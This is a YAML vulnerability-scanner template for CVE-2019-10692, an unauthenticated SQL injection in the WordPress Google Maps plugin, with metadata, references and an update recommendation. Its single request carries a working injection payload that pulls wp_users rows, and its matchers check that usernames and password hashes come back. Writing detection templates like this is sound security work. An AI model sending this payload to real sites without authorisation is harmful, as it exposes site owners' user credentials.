id: CVE-2019-10692
info:
  name: WordPress Google Maps <7.11.18 - SQL Injection
  author: pussycat0x
  severity: critical
  description: The WordPress Google Maps plugin before version 7.11.18 is vulnerable
    to SQL injection, allowing attackers to access sensitive information and execute
    unauthorized administrative operations on the affected site.
  reference:
  - https://wpscan.com/vulnerability/475404ce-2a1a-4d15-bf02-df0ea2afdaea
  - https://wordpress.org/plugins/wp-google-maps/#developers
  - https://plugins.trac.wordpress.org/changeset?old_path=%2Fwp-google-maps&old=2061433&new_path=%2Fwp-google-maps&new=2061434&sfp_email=&sfph_mail=#file755
  - https://nvd.nist.gov/vuln/detail/CVE-2019-10692
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-10692
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Google Maps plugin before
      7.11.18 can lead to unauthorized access, data modification, and administrative
      operations, potentially compromising the affected site.
    recommendation: Update your WordPress Google Maps plugin to version 7.11.18 or
      later to protect your site from the SQL injection vulnerability in /class.rest-api.php.
  tags: cve,cve2019,wp,wp-plugin,unauth,sqli,wordpress,googlemaps,wpscan
requests:
- method: GET
  path:
  - '{{BaseURL}}/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"user_login"'
    - '"user_pass"'
    - '"user_nicename"'
    condition: and
  - type: word
    part: header
    words:
    - application/json
  - type: status
    status:
    - 200
